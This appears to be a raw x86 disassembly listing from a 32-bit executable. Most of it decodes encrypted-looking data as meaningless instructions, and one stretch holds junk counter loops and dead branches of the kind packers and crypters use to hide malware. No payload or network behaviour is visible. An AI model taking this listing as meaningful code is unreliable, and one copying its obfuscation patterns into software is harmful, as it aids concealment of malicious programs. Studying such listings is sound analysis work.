  4017cf:	xlat   BYTE PTR ds:[ebx]
  4017d0:	loopne 0x40182a
  4017d2:	sub    BYTE PTR [eax],dh
  4017d4:	fsubr  QWORD PTR [ecx]
  4017d6:	neg    ebx
  4017d8:	and    esp,edx
  4017da:	inc    esp
  4017db:	aaa    
  4017dc:	and    al,0x1f
  4017de:	test   BYTE PTR [eax-0x43],cl
  4017e1:	push   eax
  4017e2:	cmp    eax,0x6d28ac27
  4017e7:	fs pop ecx
  4017e9:	sub    bh,dl
  4017eb:	fiadd  WORD PTR [ecx-0x5aacd43b]
  4017f1:	mov    WORD PTR [edx],?
  4017f3:	add    al,0x4f
  4017f5:	lahf   
  4017f6:	xor    dl,BYTE PTR [ecx-0x12]
  4017f9:	repnz jecxz 0x40178d
  4017fc:	dec    ebx
  4017fd:	(bad)  
  4017fe:	fimul  WORD PTR [ebx+eax*2]
  401801:	adc    bl,BYTE PTR [eax+0x76]
  401804:	es stos DWORD PTR es:[edi],eax
  401806:	adc    ecx,DWORD PTR [ecx-0x6c]
  401809:	push   ebp
  40180a:	mov    bh,dl
  40180c:	sub    ecx,DWORD PTR [edx]
  40180e:	cmp    bh,BYTE PTR [edx-0x51]
  401811:	or     al,0xbd
  401813:	cmp    esi,ebx
  401815:	sbb    DWORD PTR [edx-0x48],esp
  401818:	das    
  401819:	dec    ebx
  40181a:	add    ecx,DWORD PTR [edx-0x176ffddb]
  401820:	mov    ch,BYTE PTR [eax-0x40]
  401823:	pop    ecx
  401824:	sub    esp,esp
  401826:	jmp    0x4029660d
  40182b:	and    DWORD PTR [edx+esi*2],0x50
  40182f:	xchg   bl,al
  401831:	(bad)  
  401832:	mov    esi,edi
  401834:	int3   
  401835:	xchg   ebx,eax
  401836:	mov    esi,0x732118b
  40183b:	mov    dl,BYTE PTR [edi]
  40183d:	dec    ebx
  40183e:	pop    ds
  40183f:	in     al,0xe7
  401841:	data16 jmp 0x4018b1
  401844:	test   al,0xe2
  401846:	ret    0xcbaa
  401849:	xor    ebx,DWORD PTR ds:0xa97bc703
  40184f:	mov    ebp,0xb4f12041
  401854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401855:	jnp    0x401835
  401857:	cmp    bl,BYTE PTR [ebp-0x4f]
  40185a:	cmp    BYTE PTR [ebp+0x65],al
  40185d:	clc    
  40185e:	ret    
  40185f:	clc    
  401860:	inc    edx
  401861:	stos   BYTE PTR es:[edi],al
  401862:	iret   
  401863:	cld    
  401864:	in     al,dx
  401865:	xlat   BYTE PTR ds:[ebx]
  401866:	mov    bl,0xef
  401868:	inc    esp
  401869:	mov    WORD PTR [edi],ds
  40186b:	out    0xec,eax
  40186d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40186e:	mov    ch,0xd2
  401870:	fwait
  401871:	dec    edx
  401872:	mul    BYTE PTR [edx-0x52a85204]
  401878:	adc    ch,BYTE PTR [ebx+0x6c]
  40187b:	mov    ebx,0x6fbab49a
  401880:	mov    esi,0x88d18eb0
  401885:	sbb    edi,DWORD PTR [ebp+0x5a]
  401888:	into   
  401889:	adc    edx,esp
  40188b:	icebp  
  40188c:	jge    0x40186e
  40188e:	jbe    0x4018e3
  401890:	jbe    0x40187c
  401892:	lahf   
  401893:	shl    DWORD PTR [edx+eax*8+0x236ce392],0xdf
  40189b:	retf   
  40189c:	ror    BYTE PTR [ebx-0x10c3dcf9],0xa4
  4018a3:	es jae 0x4018d3
  4018a6:	enter  0xad1,0x82
  4018aa:	stos   BYTE PTR es:[edi],al
  4018ab:	sub    BYTE PTR [ebp-0x23fe3a9d],ah
  4018b1:	(bad)  [ebx-0x39]
  4018b4:	cld    
  4018b5:	xchg   edx,eax
  4018b6:	add    DWORD PTR [esi],ecx
  4018b8:	hlt    
  4018b9:	cld    
  4018ba:	lea    esp,[edi-0x66]
  4018bd:	in     al,dx
  4018be:	add    eax,edi
  4018c0:	and    DWORD PTR ds:0x433837,0x0
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x7e]
  401b2b:	inc    edx
  401b2c:	jbe    0x401ae4
  401b2e:	pop    esp
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401ad9
  401b37:	push   esi
  401b38:	(bad)  
  401b39:	int3   
  401b3a:	fadd   st,st(6)
  401b3c:	mov    cl,BYTE PTR [ecx+0x8c3fb8]
  401b42:	dec    eax
  401b43:	sub    DWORD PTR [esi-0xc],edi
  401b46:	push   edi
  401b47:	fisubr DWORD PTR [edx]
  401b49:	bound  ebx,QWORD PTR [ecx-0x3da8786e]
  401b4f:	retf   0x38bb
  401b52:	adc    DWORD PTR ds:0xf7acb13b,ecx
  401b58:	cmp    DWORD PTR [ebx-0x21],0x15163c51
  401b5f:	sahf   
  401b60:	cmp    edi,DWORD PTR [ebp+0x4c]
  401b63:	loopne 0x401bad
  401b65:	imul   edx,edi,0xfe990242
  401b6b:	out    dx,eax
  401b6c:	push   esi
  401b6d:	mov    ch,0x24
  401b6f:	lock xchg esp,eax
  401b71:	sbb    BYTE PTR [edx+0xc],dl
  401b74:	and    eax,DWORD PTR [esi+0x54]
  401b77:	fadd   st(2),st
  401b79:	jmp    0xfcbd:0x3e295e92
  401b80:	aas    
  401b81:	or     edi,DWORD PTR [esi-0x5571b3a7]
  401b87:	mov    dh,0x86
  401b89:	or     dh,BYTE PTR [edi-0x3dba8c9d]
  401b8f:	dec    eax
  401b90:	retf   0x281
  401b93:	or     BYTE PTR [esi+0x2852d52d],bh
  401b99:	mov    DWORD PTR [edx+0x79d89f09],ebp
  401b9f:	into   
  401ba0:	cmp    al,0xef
  401ba2:	cld    
  401ba3:	mov    al,ds:0x3ab09310
  401ba8:	push   ds
  401ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401baa:	hlt    
  401bab:	pop    ss
  401bac:	addr16 std 
  401bae:	mul    ebx
  401bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb1:	pusha  
  401bb2:	push   0xfffffff2
  401bb4:	enter  0x9eb6,0x48
  401bb8:	or     ebp,DWORD PTR [ebx-0x2994818c]
  401bbe:	add    eax,0x4e206dba
  401bc3:	xlat   BYTE PTR ds:[ebx]
  401bc4:	mov    ebp,0x73eb1cad
  401bc9:	mov    DWORD PTR [edx],ebx
  401bcb:	sbb    al,0x46
  401bcd:	dec    edi
  401bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bcf:	test   al,0x5a
  401bd1:	jge    0x401b76
  401bd3:	ins    DWORD PTR es:[edi],dx
  401bd4:	hlt    
  401bd5:	ret    
  401bd6:	test   BYTE PTR [edi-0x77],dh
  401bd9:	sub    al,0x94
  401bdb:	int3   
  401bdc:	retf   0x47e7
  401bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be0:	pusha  
  401be1:	clc    
  401be2:	push   edx
  401be3:	push   ds
  401be4:	addr16 iret 
  401be6:	jmp    0x401c4d
  401be8:	jge    0x401b9e
  401bea:	pop    ds
  401beb:	fmul   st,st(0)
  401bed:	scas   al,BYTE PTR es:[edi]
  401bee:	std    
  401bef:	adc    al,0x91
  401bf1:	icebp  
  401bf2:	xchg   ebp,ebp
  401bf4:	test   DWORD PTR [edx+0x732642f5],ecx
  401bfa:	aas    
  401bfb:	jo     0x401b8f
  401bfd:	jp     0x401bf8
  401bff:	mov    ecx,0xdfdb28c3
  401c04:	ret    0xadbb
  401c07:	jmp    0x1fd9:0x577423e9
  401c0e:	lahf   
  401c0f:	imul   esi,DWORD PTR [ebp+esi*4+0x1d],0xffffff8a
  401c14:	mov    WORD PTR [esi+edx*4-0x71],ds
  401c18:	mov    ds:0xd9a14373,al
  401c1d:	out    0x47,eax
  401c1f:	mov    dh,0xb9
  401c21:	out    dx,al
  401c22:	jo     0x401c75
  401c24:	push   ds
  401c25:	retf   
  401c26:	shr    BYTE PTR [esi-0x32b6bcf6],0xfd
  401c2d:	popa   
  401c2e:	cdq    
  401c2f:	xor    cl,cl
  401c31:	sbb    DWORD PTR [esi],esp
  401c33:	add    BYTE PTR [ebx],bh
  401c35:	pop    es
  401c36:	cli    
  401c37:	mov    ds:0x75149ac4,ax
  401c3d:	push   cs
  401c3e:	dec    ecx
  401c3f:	les    edi,FWORD PTR [esi]
  401c41:	lahf   
  401c42:	sbb    DWORD PTR [ebp-0x16736ba9],eax
  401c48:	(bad)  
  401c49:	dec    ebp
  401c4a:	or     bl,BYTE PTR [edi-0x59]
  401c4d:	rol    DWORD PTR [ebx+0x1fd264c9],0x36
  401c54:	adc    ebp,0xffffffec
  401c57:	pop    es
  401c58:	stc    
  401c59:	ret    
  401c5a:	shl    DWORD PTR [esp+ebx*1-0x63d0216],1
  401c61:	mov    dh,0xa9
  401c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c64:	push   edx
  401c65:	imul   eax,eax,0x18
  401c68:	lods   al,BYTE PTR ds:[esi]
  401c69:	mov    edi,0xf901bb64
  401c6e:	sbb    DWORD PTR [ebx-0x6b9099aa],ecx
  401c74:	repz xor cl,BYTE PTR [eax-0x7d07f997]
  401c7b:	mov    esp,DWORD PTR [edi-0x5b]
  401c7e:	ror    BYTE PTR [ecx+ebx*8-0x52],cl
  401c82:	mov    cl,0xb8
  401c84:	xlat   BYTE PTR ds:[ebx]
  401c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c86:	cwde   
  401c87:	addr16 std 
  401c89:	add    DWORD PTR [edx-0xe],ecx
  401c8c:	dec    edx
  401c8d:	test   bh,ch
  401c8f:	gs inc edi
  401c91:	dec    ebx
  401c92:	cmp    ecx,esp
  401c94:	into   
  401c95:	inc    ecx
  401c96:	repnz mov ?,WORD PTR [ecx+ebx*2+0x1903c232]
  401c9e:	jmp    0x401c53
  401ca0:	lods   al,BYTE PTR ds:[esi]
  401ca1:	xor    al,0x45
  401ca3:	xchg   ecx,eax
  401ca4:	lock stos DWORD PTR es:[edi],eax
  401ca6:	(bad)  
  401ca7:	cld    
  401ca8:	mov    al,0xb7
  401caa:	iret   
  401cab:	pop    edx
  401cac:	(bad)  
  401cad:	out    dx,al
  401cae:	jnp    0x401d05
  401cb0:	fistp  WORD PTR [eax]
  401cb2:	xchg   ebp,eax
  401cb3:	dec    eax
  401cb4:	scas   al,BYTE PTR es:[edi]
  401cb5:	add    BYTE PTR [edi+0x38],0x8b
  401cb9:	mov    dl,0xe9
  401cbb:	not    BYTE PTR [ecx-0x2cf7d366]
  401cc1:	xor    BYTE PTR [ebp-0x3],0x49
  401cc5:	sbb    al,0xe2
  401cc7:	sub    dh,BYTE PTR [edx+0x5a]
  401cca:	ror    ebx,0x8b
  401ccd:	ins    BYTE PTR es:[edi],dx
  401cce:	cwde   
  401ccf:	into   
  401cd0:	stos   DWORD PTR es:[edi],eax
  401cd1:	ins    DWORD PTR es:[edi],dx
  401cd2:	mov    ch,0x69
  401cd4:	loope  0x401d13
  401cd6:	aaa    
  401cd7:	mov    DWORD PTR [ebx-0x1b],edx
  401cda:	push   es
  401cdb:	mov    ds:0x95022f69,eax
  401ce0:	dec    esp
  401ce1:	mov    al,0xdc
  401ce3:	inc    esp
  401ce4:	add    edx,eax
  401ce6:	cmp    DWORD PTR [esi+esi*1],esp
  401ce9:	push   edx
  401cea:	push   edx
  401ceb:	mov    ebx,0x1b054368
  401cf0:	inc    edi
  401cf1:	adc    eax,0xe6599a51
  401cf6:	jnp    0x401d2b
  401cf8:	cwde   
  401cf9:	xor    eax,0x6a725ecc
  401cfe:	test   BYTE PTR ds:0x6182250e,ah
  401d04:	into   
  401d05:	and    al,0x7c
  401d07:	sbb    ebp,edi
  401d09:	push   ebp
  401d0a:	add    al,0xa4
  401d0c:	and    DWORD PTR [ebp-0x126bddef],edx
  401d12:	cmp    edx,DWORD PTR [ebp-0x2e81c77b]
  401d18:	dec    eax
  401d19:	nop
  401d1a:	push   0xffffffb2
  401d1c:	es mov ah,0x84
  401d1f:	and    al,0xd1
  401d21:	xor    edi,DWORD PTR [esi-0x33290641]
  401d27:	inc    ebx
  401d28:	test   BYTE PTR [esi+0x12cc11f5],cl
  401d2e:	mov    ebp,0x5160e808
  401d33:	es sub al,0x56
  401d36:	int3   
  401d37:	mov    cl,0xe5
  401d39:	mov    al,0x26
  401d3b:	dec    ebp
  401d3c:	inc    eax
  401d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d3e:	cwde   
  401d3f:	dec    ebp
  401d40:	inc    esi
  401d41:	sar    DWORD PTR [esi],0x51
  401d44:	pop    ebp
  401d45:	push   ss
  401d46:	aad    0x61
  401d48:	push   edi
  401d49:	xchg   ebx,eax
  401d4a:	xor    DWORD PTR [ebx+0x3],edi
  401d4d:	repz and al,0x6d
  401d50:	ds loopne 0x401ceb
  401d53:	cmc    
  401d54:	xchg   edi,eax
  401d55:	push   eax
  401d56:	push   esp
  401d57:	xchg   edi,eax
  401d58:	loopne 0x401d27
  401d5a:	dec    edx
  401d5b:	out    0xd,al
  401d5d:	clc    
  401d5e:	push   eax
  401d5f:	dec    eax
  401d60:	addr16 cld 
  401d62:	push   esp
  401d63:	test   DWORD PTR [edx-0x32eed178],eax
  401d69:	push   0x77
  401d6b:	adc    eax,0xbdb1bcba
  401d70:	ins    BYTE PTR es:[edi],dx
  401d71:	sar    ebp,cl
  401d73:	sub    al,0x9b
  401d75:	inc    esp
  401d76:	mov    dh,BYTE PTR [esi]
  401d78:	test   al,0xf0
  401d7a:	xchg   ecx,eax
  401d7b:	sub    esi,DWORD PTR [esp+eax*1]
  401d7e:	pop    edx
  401d7f:	rcl    BYTE PTR ds:0x3abf57d9,1
  401d85:	aas    
  401d86:	scas   eax,DWORD PTR es:[edi]
  401d87:	jnp    0x401da4
  401d89:	cs mov edx,0xb306289c
  401d8f:	add    DWORD PTR [esi-0x19],eax
  401d92:	mov    dl,bl
  401d94:	mov    WORD PTR [eax],ds
  401d96:	dec    esp
  401d97:	ss rcr ecx,1
  401d9a:	stos   BYTE PTR es:[edi],al
  401d9b:	add    esp,DWORD PTR [ebp-0x64]
  401d9e:	ret    0xd163
  401da1:	push   ebp
  401da2:	dec    esi
  401da3:	sbb    al,0xc1
  401da5:	(bad)  
  401da6:	(bad)  
  401da7:	dec    esp
  401da8:	xlat   BYTE PTR ds:[ebx]
  401da9:	in     eax,dx
  401daa:	ja     0x401d96
  401dac:	push   es
  401dad:	outs   dx,BYTE PTR ds:[esi]
  401dae:	mov    dl,0x4a
  401db0:	gs (bad) 
  401db2:	jo     0x401d88
  401db4:	pusha  
  401db5:	xchg   esi,eax
  401db6:	icebp  
  401db7:	dec    esp
  401db8:	pop    ecx
  401db9:	push   ds
  401dba:	inc    esp
  401dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dbc:	cmp    al,BYTE PTR [ebx+ecx*8+0x70de64d9]
  401dc3:	aam    0x1a
  401dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dc6:	jo     0x401d9e
  401dc8:	mov    eax,0x4b35a0d0
  401dcd:	imul   esi,DWORD PTR [ebx+ecx*8],0x3952451a
  401dd4:	(bad)  
  401dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd6:	push   es
  401dd7:	xchg   edx,eax
  401dd8:	jmp    0x26e8c475
  401ddd:	sti    
  401dde:	push   DWORD PTR [ebx]
  401de0:	aas    
  401de1:	(bad)  
  401de2:	mov    esp,0xb842fbe7
  401de7:	or     edx,ebp
  401de9:	cli    
  401dea:	pop    eax
  401deb:	in     eax,dx
  401dec:	fcom   DWORD PTR [ecx-0x43]
  401def:	rcl    DWORD PTR [ecx+0x34],0x51
  401df3:	xchg   BYTE PTR [esi+0x72ae9db7],bh
  401df9:	and    bh,ch
  401dfb:	push   ds
  401dfc:	(bad)  
  401dfd:	mov    dl,cl
  401dff:	int3   
  401e00:	out    dx,al
  401e01:	popf   
  401e02:	xor    BYTE PTR [edi],al
  401e04:	mul    ecx
  401e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e07:	imul   edi,DWORD PTR [esi],0x20
  401e0a:	mov    edi,0xfad719be
  401e0f:	inc    ebx
  401e10:	(bad)  
  401e12:	(bad)
  401e16:	or     al,0xd5
  401e18:	add    ebx,ebx
  401e1a:	iret   
  401e1b:	(bad)  
  401e1c:	and    esi,DWORD PTR ds:0xf241bc27
  401e22:	inc    ecx
  401e23:	repz push ds
  401e25:	lods   al,BYTE PTR ds:[esi]
  401e26:	test   eax,0xbe8016e
  401e2b:	adc    dl,BYTE PTR [edi-0x244d3703]
  401e31:	add    al,0xfa
  401e33:	fisub  DWORD PTR [edi]
  401e35:	and    al,0xe1
  401e37:	add    DWORD PTR [edi],esp
  401e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e3a:	scas   eax,DWORD PTR es:[edi]
  401e3b:	sub    ebp,DWORD PTR [ecx+0x15]
  401e3e:	outs   dx,DWORD PTR ds:[esi]
  401e3f:	(bad)  [esi+ecx*8-0x50]
  401e43:	xchg   DWORD PTR [ecx],eax
  401e45:	dec    ebx
  401e46:	or     BYTE PTR [ebx+0x292066b],ch
  401e4c:	lock arpl WORD PTR [ebp+edi*4+0x6d931d65],sp
  401e54:	mov    BYTE PTR [edi],ch
  401e56:	jl     0x401de5
  401e58:	jne    0x401e91
  401e5a:	or     bl,BYTE PTR [ebp+0x1e]
  401e5d:	es imul esi,esi,0x9a2b742
  401e64:	(bad)  
  401e65:	and    ebx,esi
  401e67:	dec    edx
  401e68:	mov    al,ds:0x65cccc27
  401e6d:	test   al,0xa2
  401e6f:	popa   
  401e70:	xchg   esi,eax
  401e71:	pop    edi
  401e72:	lds    ebx,FWORD PTR [edi]
  401e74:	xor    eax,0x7e78d7ac
  401e79:	cmc    
  401e7a:	js     0x401e8d
  401e7c:	jle    0x401e82
  401e7e:	sbb    edi,esi
  401e80:	loopne 0x401e1d
  401e82:	ins    DWORD PTR es:[edi],dx
  401e83:	out    0x77,eax
  401e85:	or     al,0xf6
  401e87:	not    BYTE PTR [eax+0x1b]
  401e8a:	xchg   esi,eax
  401e8b:	xor    eax,0xef79405f
  401e90:	fs xchg esp,eax
  401e92:	cmp    eax,0x2674fb1d
  401e97:	and    ch,BYTE PTR ds:0x31d3ab83
  401e9d:	sti    
  401e9e:	add    cl,BYTE PTR ds:0x57471cba
  401ea4:	outs   dx,DWORD PTR ds:[esi]
  401ea5:	fcomp  DWORD PTR [eax-0x21]
  401ea8:	cld    
  401ea9:	adc    al,0x0
  401eab:	(bad)  
  401eac:	fcomp  QWORD PTR [esi+0xa]
  401eaf:	mov    DWORD PTR [edi+0x513c5381],eax
  401eb5:	push   cs
  401eb6:	adc    bl,ah
  401eb8:	pop    ds
  401eb9:	dec    DWORD PTR [edi-0x32c2b1c6]
  401ebf:	rcr    DWORD PTR [ebx-0x68],1
  401ec2:	xchg   DWORD PTR [esi+eiz*8+0x7d7c0ce],esi
  401ec9:	aad    0xc2
  401ecb:	add    esi,eax
  401ecd:	or     eax,0x489a1f2f
  401ed2:	add    al,cl
  401ed4:	fwait
  401ed5:	mov    eax,0xf7e68aa9
  401eda:	adc    al,0x90
  401edc:	mov    esp,0x8e760203
  401ee1:	mov    ecx,0xe4724a7
  401ee6:	idiv   BYTE PTR [ebx]
  401ee8:	push   edi
  401ee9:	jo     0x401f67
  401eeb:	add    eax,0xfd2a630c
  401ef0:	and    ebx,edi
  401ef2:	pop    ecx
  401ef3:	shl    DWORD PTR [eax+0xc],0xa7
  401ef7:	dec    esi
  401ef8:	inc    edx
  401ef9:	shl    DWORD PTR [eax+0x61],cl
  401efc:	xchg   esi,eax
  401efd:	aad    0x46
  401eff:	pushf  
  401f00:	mov    ah,0xe
  401f02:	sbb    bl,BYTE PTR [eax-0x5d36e5a]
  401f08:	inc    ebx
  401f09:	cmp    al,0x5c
  401f0b:	xchg   ebp,eax
  401f0c:	jne    0x401f67
  401f0e:	jnp    0x401ee1
  401f10:	dec    ecx
  401f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f12:	adc    BYTE PTR [ecx],al
  401f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f15:	arpl   WORD PTR [ecx-0x4f],sp
  401f18:	and    edi,DWORD PTR [edx]
  401f1a:	gs lahf 
  401f1c:	lds    ebp,FWORD PTR [ebx]
  401f1e:	into   
  401f1f:	inc    ebx
  401f20:	fwait
  401f21:	cmc    
  401f22:	push   ds
  401f23:	jp     0x401f2e
  401f25:	xor    DWORD PTR [eax+0x3],0xb1d8bc7
  401f2c:	cmp    BYTE PTR [ebx+0x0],al
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	xor    DWORD PTR [ebp+edx*8-0x4a],ebp
  401f60:	dec    ebp
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	leave  
  401f69:	push   eax
  401f6a:	dec    edx
  401f6b:	imul   dh
  401f6d:	cmp    BYTE PTR [esp+esi*1+0x4709a053],dl
  401f74:	test   DWORD PTR [edi+0x61ca9aa1],eax
  401f7a:	pusha  
  401f7b:	add    al,dl
  401f7d:	out    dx,eax
  401f7e:	scas   eax,DWORD PTR es:[edi]
  401f7f:	inc    esi
  401f80:	jp     0x401f41
  401f82:	nop
  401f83:	arpl   WORD PTR [edi+0x31f58c9a],ax
  401f89:	repnz lahf 
  401f8b:	nop
  401f8c:	xchg   BYTE PTR [eax],bh
  401f8e:	inc    edx
  401f8f:	pop    ds
  401f90:	dec    DWORD PTR [esi-0x55]
  401f93:	dec    eax
  401f94:	inc    esp
  401f95:	loope  0x401f73
  401f97:	test   BYTE PTR [edi-0x22848f50],dl
  401f9d:	(bad)
  401fa1:	jecxz  0x401fcd
  401fa3:	pop    eax
  401fa4:	or     bh,BYTE PTR [edi]
  401fa6:	xchg   ecx,eax
  401fa7:	xor    al,0x8c
  401fa9:	dec    edi
  401faa:	push   es
  401fab:	inc    edx
  401fac:	push   ebx
  401fad:	dec    esp
  401fae:	push   ss
  401faf:	push   esp
  401fb0:	xchg   edx,eax
  401fb1:	test   eax,0xc904510
  401fb6:	mov    edx,0x8901fb2d
  401fbb:	daa    
  401fbc:	stos   BYTE PTR es:[edi],al
  401fbd:	popf   
  401fbe:	jae    0x401f9f
  401fc0:	inc    eax
  401fc1:	push   edi
  401fc2:	aam    0x9f
  401fc4:	in     al,0x56
  401fc6:	cli    
  401fc7:	sub    DWORD PTR [ebx+edi*8],esi
  401fca:	jg     0x401fc0
  401fcc:	or     cl,BYTE PTR [eax+0x1c3b52f8]
  401fd2:	(bad)  
  401fd3:	adc    cl,BYTE PTR [ecx]
  401fd5:	mov    eax,0x7743eafb
  401fda:	jp     0x40200a
  401fdc:	mov    WORD PTR [edx],ds
  401fde:	das    
  401fdf:	in     eax,dx
  401fe0:	xor    bh,BYTE PTR [ebx-0x66172a16]
  401fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fe7:	int    0x2a
  401fe9:	mov    ds:0xbec0a449,al
  401fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fef:	xchg   ecx,eax
  401ff0:	test   al,0xb6
  401ff2:	pusha  
  401ff3:	push   0xedd4f8af
  401ff8:	shl    DWORD PTR [ebp+0x42e6f034],cl
  401ffe:	pusha  
  401fff:	sbb    DWORD PTR [ecx],esp
  402001:	or     ebx,0x50
  402004:	hlt    
  402005:	fwait
  402006:	mov    dl,0xc9
  402008:	aad    0x8e
  40200a:	push   ebp
  40200b:	(bad)  
  40200c:	stc    
  40200d:	or     DWORD PTR [edx],esi
  40200f:	leave  
  402010:	inc    ebx
  402011:	dec    ebx
  402012:	xor    eax,0x17d31333
  402017:	out    0x3c,eax
